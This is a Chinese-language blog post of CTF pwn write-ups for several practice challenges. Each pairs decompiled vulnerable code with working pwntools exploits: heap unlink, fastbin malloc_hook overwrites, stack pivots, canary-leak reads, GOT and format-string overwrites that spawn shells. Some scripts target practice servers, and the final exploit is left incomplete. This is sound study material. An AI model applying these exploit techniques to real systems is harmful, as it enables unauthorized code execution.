+++
date = '2025-09-15T20:41:43+08:00'
draft = false
title = 'pwn Wp'

+++

# pwn

> 这里的题目我已经写了一部分了之前的wp会分开补发，现在的是我在学的时候学的一个顺序

## hitcontraining_bamboobox

这个题目还是比较简单的一个题目，因此我们这里直接进行代码的分析直接使用ida进行一个反编译

```c
unsigned __int64 change_item()
{
  int v1; // [rsp+4h] [rbp-2Ch]
  int v2; // [rsp+8h] [rbp-28h]
  char buf[16]; // [rsp+10h] [rbp-20h] BYREF
  char nptr[8]; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of item:");
    read(0, buf, 8uLL);
    v1 = atoi(buf);
    if ( *((_QWORD *)&unk_6020C8 + 2 * v1) )
    {
      printf("Please enter the length of item name:");
      read(0, nptr, 8uLL);
      v2 = atoi(nptr);
      printf("Please enter the new name of the item:");
      *(_BYTE *)(*((_QWORD *)&unk_6020C8 + 2 * v1) + (int)read(0, *((void **)&unk_6020C8 + 2 * v1), v2)) = 0;// edit 溢出
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No item in the box");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

```c
int show_item()
{
  int i; // [rsp+Ch] [rbp-4h]

  if ( !num )
    return puts("No item in the box");
  for ( i = 0; i <= 99; ++i )
  {
    if ( *((_QWORD *)&unk_6020C8 + 2 * i) )
      printf("%d : %s", i, *((const char **)&unk_6020C8 + 2 * i));
  }
  return puts(byte_401089);
}
```

```c
__int64 add_item()
{
  int i; // [rsp+4h] [rbp-1Ch]
  int v2; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( num > 99 )
  {
    puts("the box is full");
  }
  else
  {
    printf("Please enter the length of item name:");
    read(0, buf, 8uLL);
    v2 = atoi(buf);
    if ( !v2 )
    {
      puts("invaild length");
      return 0LL;
    }
    for ( i = 0; i <= 99; ++i )
    {
      if ( !*((_QWORD *)&unk_6020C8 + 2 * i) )
      {
        *((_DWORD *)&itemlist + 4 * i) = v2;
        *((_QWORD *)&unk_6020C8 + 2 * i) = malloc(v2);
        printf("Please enter the name of item:");
        *(_BYTE *)(*((_QWORD *)&unk_6020C8 + 2 * i) + (int)read(0, *((void **)&unk_6020C8 + 2 * i), v2)) = 0;
        ++num;
        return 0LL;
      }
    }
  }
  return 0LL;
}
```

```c
unsigned __int64 remove_item()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of item:");
    read(0, buf, 8uLL);
    v1 = atoi(buf);
    if ( *((_QWORD *)&unk_6020C8 + 2 * v1) )
    {
      free(*((void **)&unk_6020C8 + 2 * v1));
      *((_QWORD *)&unk_6020C8 + 2 * v1) = 0LL;
      *((_DWORD *)&itemlist + 4 * v1) = 0;
      puts("remove successful!!");
      --num;
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No item in the box");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

至此我已经把我该脚本中的核心代码部分进行了一个粘贴，下面我进行一个解释

add:

```tex
这个函数主要是对堆块的一个创建，和内如的一个写入
```

edit：

```tex
出现堆溢出的情况
```

free：

```tex
这里主要是没有出现uaf
```

show：

```tex
创建查看到一个文件的内容
```

这里的思路是：

- 通过edit对chunk进行一个溢出

- 攻击手法使用通过fastbin，获得malloc_hook或者使用unlink使用free hook连接system

这里我们我们使用的方法是通过unlink进行一个freehook的获取攻击

```py
from pwn import *
from LibcSearcher import *
#r=process('bamboobox')
r=remote('node3.buuoj.cn',29464)
elf=ELF('bamboobox')
context.log_level="debug"


def add(length,context):
    r.recvuntil("Your choice:")
    r.sendline("2")
    r.recvuntil("Please enter the length of item name:")
    r.sendline(str(length))
    r.recvuntil("Please enter the name of item:")
    r.send(context)

def edit(idx,length,context):
    r.recvuntil("Your choice:")
    r.sendline("3")
    r.recvuntil("Please enter the index of item:")
    r.sendline(str(idx))
    r.recvuntil("Please enter the length of item name:")
    r.sendline(str(length))
    r.recvuntil("Please enter the new name of the item:")
    r.send(context)

def free(idx):
    r.recvuntil("Your choice:")
    r.sendline("4")
    r.recvuntil("Please enter the index of item:")
    r.sendline(str(idx))

def show():
    r.sendlineafter("Your choice:", "1")

add(0x40,'a' * 8)
add(0x80,'b' * 8)
add(0x80,'c' * 8)
add(0x20,'/bin/sh\x00')
#gdb.attach(r)

ptr=0x6020c8
fd=ptr-0x18
bk=ptr-0x10

fake_chunk=p64(0)
fake_chunk+=p64(0x41)
fake_chunk+=p64(fd)
fake_chunk+=p64(bk)
fake_chunk+='\x00'*0x20
fake_chunk+=p64(0x40)
fake_chunk+=p64(0x90)

edit(0,len(fake_chunk),fake_chunk)
#gdb.attach(r)

free(1)
free_got=elf.got['free']
log.info("free_got:%x",free_got)
payload=p64(0)+p64(0)+p64(0x40)+p64(free_got)
edit(0,len(fake_chunk),payload)
#gdb.attach(r)

show()
free_addr=u64(r.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) 
log.info("free_addr:%x",free_addr)
libc=LibcSearcher('free',free_addr)
libc_base=free_addr-libc.dump('free')
log.info("libc_addr:%x",libc_base)
system_addr=libc_base+libc.dump('system')
log.info("system_addr:%x",system_addr)
edit(0,0x8,p64(system_addr))

#gdb.attach(r)


free(3)
r.interactive()
‘’’
这里的思路主要是通过unlink吧chunk0块申请出来，然后再这个位置吧我们的free hook写入进行，获取到libc地址，最后在这个位置写入system函数的地址来获取权限
‘’‘
```

fastbin:

```py
from pwn import *

p = process('/home/fofa/bamboobox')
libc = ELF('/home/fofa/桌面/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
context.log_level = 'debug'

def duan():
    gdb.attach(p)
    pause()
def add(size,content):
    p.sendlineafter('choice:','2')
    p.sendlineafter('name:',str(size))
    p.sendafter('item:',content)
def show():
    p.sendlineafter('choice:','1')
def edit(index,size,content):
    p.sendlineafter('choice:','3')
    p.sendlineafter('item:',str(index))
    p.sendlineafter('name:',str(size))
    p.sendafter('item:',content)
def delete(index):
    p.sendlineafter('choice:','4')
    p.sendlineafter('item:',str(index))

og = [0x45226,0x4527a,0xf0364,0xf1207]

add(0x20,'aaaaaaaa')
add(0x20,'bbbbbbbb')
add(0x60,'cccccccc')
add(0x10,'cccccccc')

edit(0,0x30,b'a'*0x20+p64(0)+p64(0xa1))
delete(1)
add(0x20,'aaaaaaaa')
show()
libc_base = u64(p.recv(0x3a)[-6:].ljust(8,b'\x00'))-88-0x10-libc.symbols['__malloc_hook']
malloc_hook = libc_base+libc.symbols['__malloc_hook']
realloc = libc_base+libc.symbols['realloc']
print ('libc_base-->'+hex(libc_base))
print ('malloc_hook-->'+hex(malloc_hook))
shell = libc_base+og[3]

add(0x60,'bbbbbbbb')
delete(4)
edit(2,0x10,p64(malloc_hook-0x23))
add(0x60,'aaaaaaaa')
add(0x60,'a'*(0x13-0x8)+p64(shell)+p64(realloc+20))
# p.sendlineafter('choice:','2')
# p.sendlineafter('name:',str(0x10))

gdb.attach(p)
p.interactive()
'''
这个使用的方法同样可以调用，但是需要调一下，
思路：
构建一个溢出，获得libc，再通过og进行一个权限获取，主要是malloc-hook-0x23的位置有一个0x70的一个size，可以申请malloc-hook出来，从而获得权限，但是我是用这个方法并不能chengg
'''
```

## actf_2019_babystack

这里我们直接看保护和ida反编译

```shell
[*] '/home/fofa/ACTF_2019_babystack'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  _BYTE s[208]; // [rsp+0h] [rbp-D0h] BYREF

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  signal(14, (__sighandler_t)handler);
  alarm(0x3Cu);
  memset(s, 0, sizeof(s));
  puts("Welcome to ACTF's babystack!");
  sleep(3u);
  puts("How many bytes of your message?");
  putchar(62);
  sub_400A1A();
  if ( nbytes <= 0xE0 )
  {
    printf("Your message will be saved at %p\n", s);
    puts("What is the content of your message?");
    putchar(62);
    read(0, s, nbytes);
    puts("Byebye~");
    return 0LL;
  }
  else
  {
    puts("I've checked the boundary!");
    return 1LL;
  }
}
```

在这里我们知道我们写入的数据就只能放到返回地址的位置因此我们只能使用栈迁移进行一个攻击这里直接使用exp：

```py
from pwn import *
from LibcSearcher import *
context(log_level='debug',arch='amd64',os='linux')

elf=ELF('/home/fofa/ACTF_2019_babystack')
libc=ELF('/home/fofa/buulibc/libc-2.27-64.so')
#p=process('./ACTF_2019_babystack')
p=remote('node5.buuoj.cn',26823)

main=0x4008f6
leave=0x400a18
pop_rdi=0x400ad3
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']

p.recvuntil('>')
p.sendline(str(0xe0))
p.recvuntil('Your message will be saved at ')
s_addr=int(p.recvuntil('\n',drop=True),16)

payload = b'a'*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
payload += b'a'*(0xd0-len(payload))+p64(s_addr)+p64(leave)

p.recvline()
p.recvuntil('>')
p.send(payload)

p.recvuntil('Byebye~\n')
puts_addr = u64(p.recvuntil('\n',drop = True).ljust(8,b'\x00'))
libcbase = puts_addr - libc.symbols['puts']
one_gadget = libcbase + 0x4f2c5


p.recvuntil('>')
p.sendline(str(0xe0))
p.recvuntil('Your message will be saved at ')
s_addr=int(p.recvuntil('\n',drop=True),16)

payload = b'a'*8 + p64(one_gadget)
payload += b'a'*(0xd0-len(payload))+p64(s_addr)+p64(leave)

p.recvline()
p.recvuntil('>')
p.send(payload)

p.interactive()

```

## wdb2018_guess

这个题目也是要给一个有意思的题目这里就直接上ida和保护

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __WAIT_STATUS stat_loc; // [rsp+14h] [rbp-8Ch] BYREF
  __int64 v6; // [rsp+20h] [rbp-80h]
  __int64 v7; // [rsp+28h] [rbp-78h]
  char buf[48]; // [rsp+30h] [rbp-70h] BYREF
  char s2[56]; // [rsp+60h] [rbp-40h] BYREF
  unsigned __int64 v10; // [rsp+98h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  v7 = 3LL;
  LODWORD(stat_loc.__uptr) = 0;
  v6 = 0LL;
  sub_4009A6(a1, a2, a3);
  HIDWORD(stat_loc.__iptr) = open("./flag.txt", 0);
  if ( HIDWORD(stat_loc.__iptr) == -1 )
  {
    perror("./flag.txt");
    _exit(-1);
  }
  read(SHIDWORD(stat_loc.__iptr), buf, 0x30uLL);
  close(SHIDWORD(stat_loc.__iptr));
  puts("This is GUESS FLAG CHALLENGE!");
  while ( 1 )
  {
    if ( v6 >= v7 )
    {
      puts("you have no sense... bye :-) ");
      return 0LL;
    }
    if ( !(unsigned int)sub_400A11() )
      break;
    ++v6;
    wait((__WAIT_STATUS)&stat_loc);
  }
  puts("Please type your guessing flag");
  gets(s2);
  if ( !strcmp(buf, s2) )
    puts("You must have great six sense!!!! :-o ");
  else
    puts("You should take more effort to get six sence, and one more challenge!!");
  return 0LL;
}
```

这里这个就是一个逻辑：我们连续输入3次并且，他再stack上写入了flag这个文件因此我们需要获取到栈上的一个数据，这里需要泄露数据，注意一个要点是我们canary溢出后还是可以运行的所以可以使用canary进行一个泄露信息，这里我们可以使用的方法是通过libc的函数来泄露栈的地址，获取flag文件

```py
#coding:utf8
from pwn import *
from LibcSearcher import *

p = process('/home/fofa/GUESS')
# p = remote('node5.buuoj.cn',29278)
elf = ELF('/home/fofa/GUESS')
puts_got = elf.got['puts']
context.log_level="debug"

#泄露puts地址


payload=b'a'*0x128 + p64(puts_got)
p.sendlineafter('Please type your guessing flag',payload)
p.recvuntil('stack smashing detected ***: ')

puts_addr = u64(p.recv(6).ljust(8,b'\x00'))
info("puta_addr:"+hex(puts_addr))
libc=ELF('/home/fofa/桌面/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')

libc_base = puts_addr - libc.sym['puts']
environ_addr = libc_base + libc.sym['__environ']
print ('environ_addr=',hex(environ_addr))

#泄露栈地址
payload=b'a'*0x128 + p64(environ_addr)
p.sendlineafter('Please type your guessing flag',payload)
#

p.recvuntil('stack smashing detected ***: ')
stack_addr = u64(p.recv(6).ljust(8,b'\x00'))
print ('stack_addr=',hex(stack_addr))
# gdb.attach(p)
gdb.attach(p)
pause()
flag_addr = stack_addr - 0x168
print ('flag_addr=',hex(flag_addr))
#泄露flag
payload=b'a'*0x128 + p64(flag_addr)
p.sendlineafter('Please type your guessing flag',payload)

p.interactive()

```

## zctf_2016_note3

ida

```c
int addr()
{
  int i; // [rsp+Ch] [rbp-14h]
  __int64 size; // [rsp+10h] [rbp-10h]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 6 && *(&ptr + i); ++i )
    ;
  if ( i == 7 )
    puts("Note is full, add fail");
  puts("Input the length of the note content:(less than 1024)");
  size = sub_4009B9();
  if ( size < 0 )
    return puts("Length error");
  if ( size > 1024 )
    return puts("Content is too long");
  v3 = malloc(size);
  puts("Input the note content:");
  sub_4008DD(v3, size, 10LL);
  *(&ptr + i) = v3;
  qword_6020C0[i + 8] = size;//这个位置写了chunk的位置，但是该位置和我们的chunk的地址内存存放地点是同一个数组，因此可能存在着一个溢出，size的一个篡改的问题
  qword_6020C0[0] = (__int64)*(&ptr + i);
  return printf("note add success, the id is %d\n", i);
}
```

```c
int sub_400BFD()
{
  return puts("No show, No leak.");
}
```

```c
int sub_400C0D()
{
  __int64 v0; // rax
  __int64 v1; // rax
  __int64 v3; // [rsp+8h] [rbp-8h]

  puts("Input the id of the note:");
  v0 = sub_4009B9();
  v3 = v0 % 7//验证是否是7的倍数要求idx要小于7
  if ( v0 % 7 >= v0 )
  {
    v1 = (__int64)*(&ptr + v3);
    if ( v1 )
    {
      puts("Input the new content:");
      sub_4008DD(*(&ptr + v3), qword_6020C0[v3 + 8], 10LL);//这里存在一个溢出
      qword_6020C0[0] = (__int64)*(&ptr + v3);
      LODWORD(v1) = puts("Edit success");
    }
  }
  else
  {
    LODWORD(v1) = puts("please input correct id.");
  }
  return v1;
}
```

```c
int sub_400B33()
{
  __int64 v0; // rax
  __int64 v1; // rax
  __int64 v3; // [rsp+8h] [rbp-8h]

  puts("Input the id of the note:");
  v0 = sub_4009B9();
  v3 = v0 % 7;
  if ( v0 % 7 >= v0 )
  {
    v1 = (__int64)*(&ptr + v3);
    if ( v1 )
    {
      free(*(&ptr + v3));
      if ( (void *)qword_6020C0[0] == *(&ptr + v3) )//没有uaf
        qword_6020C0[0] = 0LL;
      *(&ptr + v3) = 0LL;
      LODWORD(v1) = puts("Delete success");
    }
  }
  else
  {
    LODWORD(v1) = puts("please input correct id.");
  }
  return v1;
}
```

### 思路

**1.unlink**

添加7个块后，再添加一个块(`i=7`)，这时块0的大小会被改的很大(值为块7的地址)，然后在块0中构造fake_chunk并溢出到下一个块修改header数据实现unlink。需要注意第`i=1`个块时大小要超过fastbin的范围。

**2.泄露地址**

unlink后可以实现任意写。为了泄露函数地址，需要执行输出函数，可以将`free@got`值改为`puts@plt`值，然后将块`i`的地址改为`puts@got`的地址，这时调用删除功能`free(块i)`就可以输出`puts@got`的值，从而得到动态链接库加载地址，进一步得到`system`地址。

**3.getshell**

最后将`atoi@got`值改为`system`地址，然后在选择功能时输入`/bin/sh`即可得到shell。



```py
from pwn import *
context(log_level='debug' ,arch='amd64' ,os='linux')
# io = remote("node5.buuoj.cn",27011)
io =process("/home/fofa/zctf_2016_note3")

def add_chunk(size,content):
    io.sendlineafter("option--->>",'1')
    io.sendlineafter("Input the length of the note content:(less than 1024)",str(size))
    io.sendlineafter("Input the note content:",content)

def edit_chunk(idx,content):
    io.sendlineafter("option--->>", '3')
    io.sendlineafter("Input the id of the note:", str(idx))
    io.sendlineafter("Input the new content:", content)

def delete_chunk(idx):
    io.sendlineafter("option--->>", '4')
    io.sendlineafter("Input the id of the note:", str(idx))

add_chunk(0x40, 'b'*32)
add_chunk(0x80, 'b'*32)
add_chunk(0x80, 'b'*32)
add_chunk(0x80, 'b'*32)
add_chunk(0x80, 'b'*32)
add_chunk(0x80, 'b'*32)
add_chunk(0x80, 'b'*32)
add_chunk(0x80, 'b'*32)
gdb.attach(io)
p = 0x6020C8
fd = p-0x18
bk = p-0x10
payload = p64(0) + p64(0x31) + p64(fd) + p64(bk) + b'a'*0x10 + p64(0x30) + b'b'*0x8
payload += p64(0x40) + p64(0x90)

edit_chunk(0,payload)
delete_chunk(1)
elf = ELF("/home/fofa/zctf_2016_note3")
payload = p64(0)*3 + p64(elf.got['free']) + p64(elf.got['puts']) + p64(0x6020c8)
edit_chunk(0,payload)
edit_chunk(0, p64(elf.plt['puts'])[:-1])

delete_chunk(1)

io.recvuntil('\n')
puts_addr = u64(io.recvuntil('\n')[:-1].ljust(8,b'\x00'))

info("puts_addr:"+hex(puts_addr))

libc = ELF("/home/fofa/buulibc/libc-2.23-64.so")
libc.address = puts_addr - libc.sym['puts']
sys_addr =libc.sym['system']
info("libc.address:"+hex(libc.address))
info("system:"+hex(sys_addr))

edit_chunk(2, p64(elf.got['atoi']))
edit_chunk(0, p64(sys_addr))
io.sendlineafter('option--->>','/bin/sh\x00')

# gdb.attach(io)
io.interactive()
```

## ciscn_2019_sw_1

直接上ida

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char format[68]; // [esp+0h] [ebp-48h] BYREF

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  puts("Welcome to my ctf! What's your name?");
  __isoc99_scanf("%64s", format);
  printf("Hello ");
  printf(format);
  return 0;
}
```

这里我们知道这里就只有一个输入点因此要一次就出来所以要提前进行编写文件这里直接上exp

```py
from pwn import *
io = remote("node5.buuoj.cn",25952)
# io = process("/home/fofa/ciscn_2019_sw_1")
payload =b'%2052c%13$hn%31692c%14$hn%356c%15$hn' +p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)
# gdb.attach(io,'b *0x080485A8\nc')
io.sendline(payload)

io.sendline('/bin/sh\x00')
io.interactive()
```

### 总结

我们在程序中可以知道一个程序开始的第一个函数并不是main函数，也不是一个libc_start_main，而是start这个函数，因此我们需要看一下这个的汇编和代码，这里我们使用上一题的start进行一个演示

```asm
							   public _start
.text:08048420 _start          proc near               ; DATA XREF: LOAD:08048018↑o
.text:08048420                 xor     ebp, ebp
.text:08048422                 pop     esi
.text:08048423                 mov     ecx, esp
.text:08048425                 and     esp, 0FFFFFFF0h
.text:08048428                 push    eax
.text:08048429                 push    esp             ; stack_end
.text:0804842A                 push    edx             ; rtld_fini
.text:0804842B                 push    offset __libc_csu_fini ; fini
.text:08048430                 push    offset __libc_csu_init ; init
.text:08048435                 push    ecx             ; ubp_av
.text:08048436                 push    esi             ; argc
.text:08048437                 push    offset main     ; main
.text:0804843C                 call    ___libc_start_main
.text:08048441                 hlt
.text:08048441 _start          endp
```

可以在这里知道，在start结束的时候会调用__libc_start_main,而我们需要也要了解一下libc-start-main的函数

```c
// attributes: thunk
int __cdecl __libc_start_main(
        int (__cdecl *main)(int, char **, char **),
        int argc,
        char **ubp_av,
        void (*init)(void),
        void (*fini)(void),
        void (*rtld_fini)(void),
        void *stack_end)
{
  return _libc_start_main(main, argc, ubp_av, init, fini, rtld_fini, stack_end);
```

可以看到，包含有main，init，fini，既然传进去了这些参数，那必然有他们的用处，main和init就不用多说了，fini是

同样，**__libc_start_main的返回地址就是__libc_csu_fini**，证明它是在__libc_start_main在结束后就会调用__libc_csu_fini，要是我们能对它进行一些修改，那说不定就能做一些“坏事”。我们来看看跟它相关的东西。
我们可以在fini_array段找到与__libc_csu_fini相关的东西，是数组

这个数组里存放着一些函数的指针，并且**在进入__do_global_dtors_aux这个函数中会遍历并且调用各个指针，__do_global_dtors_aux_fini_array_entry是一个在程序结束时需要调用的函数的名称，它的地址偏移量在这里被存储**，也就是说，如果我们能**把__do_global_dtors_aux_fini_array_entry指向的地址变为main函数或者其它的地址，就可以进行一些非法操作**
这就是fini_array在x86下格式化字符串的基本应用
不过需要注意的是，`_init_array的下标是从小到大开始执行，而_fini_array的下标是从大到小开始执行`这对我们构造payload起到非常关键的作用

同样也就是说我们使用的这个指针指向的是一个陈旭结束后的一个地址，可以通过这个地址来修改我们后面的参数是否需要在结束后是否继续调用main这个函数的的一个回调，因此这个是fini_array在格式化字符串的一个基本应用

## gyctf_2020_document

这个题目还是非常简单的一个题目但是又几个坑的这里我先说逻辑

```c
unsigned __int64 add()
{
  int i; // [rsp+Ch] [rbp-24h]
  _QWORD *v2; // [rsp+10h] [rbp-20h]
  _QWORD *v3; // [rsp+18h] [rbp-18h]
  __int64 s; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i < 7; ++i )
  {
    if ( !qword_202060[i] )
    {
      v2 = malloc(8uLL);
      v3 = malloc(0x80uLL);
      if ( !v2 || !v3 )
      {
        puts("Error occured!!!");
        exit(2);
      }
      puts("add success");
      *v2 = v3;
      v2[1] = 1LL;
      puts("input name");
      memset(&s, 0, sizeof(s));
      sub_AA0(&s, 8LL);
      *v3 = s;
      puts("input sex");
      memset(&s, 0, sizeof(s));
      sub_AA0(&s, 1LL);
      puts("here");
      if ( (_BYTE)s == aW[0] )
      {
        v3[1] = 1LL;
      }
      else
      {
        puts("there");
        v3[1] = 16LL;
      }
      puts("input information");
      sub_AA0(v3 + 2, 112LL);
      qword_202060[i] = v2;
      puts("Success");
      break;
    }
  }
  if ( i == 7 )
    puts("Th3 1ist is fu11");
  return __readfsqword(0x28u) ^ v5;
}
```

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // eax
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  sub_117B(a1, a2, a3);
  sub_1125();
  while ( 1 )
  {
    while ( 1 )
    {
      sub_1138();
      read(0, buf, 8uLL);
      v3 = atoi(buf);
      if ( v3 != 2LL )
        break;
      show();
    }
    if ( v3 > 2LL )
    {
      if ( v3 == 3LL )
      {
        edit();
      }
      else if ( v3 == 4LL )
      {
        delete();
      }
    }
    else if ( v3 == 1LL )
    {
      add();
    }
  }
}
```

```c
unsigned __int64 sub_1042()
{
  unsigned int v1; // [rsp+Ch] [rbp-24h]
  char buf[8]; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Give me your index : ");
  read(0, buf, 8uLL);
  v1 = atoi(buf);
  if ( v1 >= 7 )
  {
    puts("Out of list");
  }
  else if ( *((_QWORD *)&qword_202060 + v1) )
  {
    free(**((void ***)&qword_202060 + v1));
  }
  else
  {
    puts("invalid");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

```c
unsigned __int64 sub_E4E()
{
  unsigned int v1; // [rsp+8h] [rbp-28h]
  __int64 v2; // [rsp+10h] [rbp-20h]
  _BYTE *v3; // [rsp+18h] [rbp-18h]
  char buf[8]; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts("Give me your index : ");
  read(0, buf, 8uLL);
  v1 = atoi(buf);
  if ( v1 >= 7 )
  {
    puts("Out of list");
  }
  else if ( *((_QWORD *)&qword_202060 + v1) )
  {
    v2 = *((_QWORD *)&qword_202060 + v1);
    if ( *(_QWORD *)(v2 + 8) )
    {
      puts("Are you sure change sex?");
      read(0, buf, 8uLL);
      if ( buf[0] == aY[0] )
      {
        puts("3");
        v3 = (_BYTE *)(**((_QWORD **)&qword_202060 + v1) + 8LL);
        if ( *v3 == unk_13DE )
        {
          puts(&a124[2]);
          *v3 = 1;
        }
        else
        {
          puts(a124);
          *v3 = 16;
        }
      }
      else
      {
        puts(&a124[4]);
      }
      puts("Now change information");
      if ( !(unsigned int)sub_AA0(**((_QWORD **)&qword_202060 + v1) + 16LL, 112LL) )
        puts("nothing");
      *(_QWORD *)(v2 + 8) = 0LL;
    }
    else
    {
      puts("you can onyly change your letter once.");
    }
  }
  else
  {
    puts("invalid");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

上面的几个函数大概率就可以把逻辑搞清楚了这里我们说一下思路：

1.通过uaf漏洞先泄露libc 2.申请free 3.修改free-got=system

大概的思路时这样的这里我说一下坑

```tex
在创建的时候我们知道这个文件出现了一个控制块，这个控制块指向了我们数据会存放的一个数据块的位置，同时也是你edit的要给位置，因此我们这里大概想法就是通过uaf修改来修改这个控制块的大小
这里我们可以通过我们删除的chunk0，的数据块来对其他chunk进行一个控制，这样就出现了一个堆块重叠，这里出现了一个坑就是他的free文件结束后后面的hook会影响整个system函数因此要把这个数据给清空
```



exp:

```py
from pwn import *
context.log_level='debug'
io = process("/home/fofa/gyctf_2020_document")
# io = remote("node5.buuoj.cn",29814)
libc = ELF("/home/fofa/buulibc/libc-2.23-64.so")

def add_chunk(name, sex, content):
    io.recvuntil('Give me your choice : \n')
    io.sendline('1')
    io.recvuntil("input name\n")
    io.send(name)
    io.recvuntil("input sex\n")
    io.send(sex)
    io.recvuntil("input information\n")
    io.send(content)


def delete_chunk(index):
    io.recvuntil('Give me your choice : \n')
    io.sendline('4')
    io.recvuntil("Give me your index : \n")
    io.sendline(str(index))


def show_chunk(index):
    io.recvuntil('Give me your choice : \n')
    io.sendline('2')
    io.recvuntil("Give me your index : \n")
    io.sendline(str(index))


def edit_chunk(index, content):
    io.recvuntil('Give me your choice : \n')
    io.sendline('3')
    io.recvuntil("Give me your index : \n")
    io.sendline(str(index))
    io.recvuntil("Are you sure change sex?\n")
    io.send('N\n')
    io.recvuntil("Now change information\n")
    io.send(content)


add_chunk('1'+'\x00'*7, 'W'+'\x00'*7, 'a'*0x70)#0
add_chunk('2'+'\x00'*7, 'w'+'\x00'*7, 'b'*0x70)#1

delete_chunk(0)
show_chunk(0)
# io.recv()
libc.address=u64(io.recv(6)[-6:].ljust(8,b'\x00'))-0x3c4b20-0x58
info("libc.address"+hex(libc.address))
add_chunk('/bin/sh\x00', '/bin/sh\x00', 'c'*0x70)#2
delete_chunk(1)
add_chunk('/bin/sh\x00', '/bin/sh\x00', 'd'*0x70)#3
#
payload=p64(0)+p64(0x21)+p64(libc.sym['__free_hook']-0x10)+p64(0x1)+p64(0)+p64(0x51)+p64(0)*8
# payload1 = p64(0x21)+p64(0x21)
edit_chunk(0,payload)
system_addr = libc.sym['system']
edit_chunk(3,p64(system_addr)+p64(0)*13)
gdb.attach(io)

delete_chunk(1)
# gdb.attach(io)

io.interactive()
#struct.error: 'Q' format requires 0 <= number <= 报错大概率是libc的问题
```

## 黄鹤杯：aipwn

这个题目时要给非常简单的栈迁移这里就不多说了

上文件和wp

```c
int vuln()
{
  _BYTE s[44]; // [esp+8h] [ebp-30h] BYREF

  memset(s, 0, 0x28u);
  read(0, s, 0x38u);
  printf("%s", s);
  printf("Maybey AI will help you getshell");
  read(0, s, 0x38u);
  return printf("%s", s);
}
```

exp:

```py
from pwn import *


io = process("/home/fofa/AIPWN")
elf = ELF("/home/fofa/AIPWN")
gdb.attach(io)

io.sendafter("Welcome to the AI world","a"*0x38)

io.recvuntil("a"*0x38)
stack = u32(io.recv(4))
success("stack:"+hex(stack))
# level_ret = 0x8048631
# ret = 0x0804837a
#
# exp = p32(ret)+p32(0x0804837a) + p32(elf.plt["system"]) + p32(elf.plt["system"]) + p32(stack-0x48+4) + b"/bin/sh\x00"
# payload = exp.ljust(0x30,b"A") + p32(stack-0x54)+p32(0x8048631)*2
# gdb.attach(io)
# io.send(payload)

io.interactive()
```

## [SDCTF 2022]Oil Spill

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[312]; // [rsp+10h] [rbp-140h] BYREF
  unsigned __int64 v5; // [rsp+148h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  printf("%p, %p, %p, %p\n", &puts, &printf, s, temp);
  puts("Oh no! We spilled oil everywhere and its making everything dirty");
  puts("do you have any ideas of what we can use to clean it?");
  fflush(stdout);
  fgets(s, 300, stdin);
  printf(s);
  puts(x);
  fflush(stdout);
  return 0;
}
```

这里我先写上的一个比较简单的exp：

```py
from pwn import *
from LibcSearcher import *
context(os='linux', arch='amd64', log_level="debug")
# io=remote('node5.anna.nssctf.cn',25618)
io = process("/home/fofa/OilSpill")
elf=ELF('/home/fofa/OilSpill')
io.recvuntil("0x")
puts_addr=int(io.recv(12),16)
print(hex(puts_addr))
libc=LibcSearcher('puts',puts_addr)
libc_base=puts_addr - libc.dump('puts')
system_addr=libc_base + libc.dump('system')
payload=fmtstr_payload(8,{elf.got['puts']:system_addr,0x600C80:b'/bin/sh\x00'})
print(payload)
payload1 = 
io.sendlineafter("it?",payload)
io.interactive()
```



这里我们使用手写payload,这里的payload是一个思路和尝试

```py
payload1 =b'%'+bytes(str(system_addr & 0xffff), "utf-8")+b'c%10$hnaaa'+ p64(elf.got['puts'])
'''这里是对puts函数的低两位的数据进行一个更改'''
```

gdb调试

```tex
00:0000│ rsp 0x7ffda7e80200 —▸ 0x7ffda7e80478 —▸ 0x7ffda7e82392 ◂— '/home/fofa/OilSpill'
01:0008│-148 0x7ffda7e80208 ◂— 0x1bdaf4e77
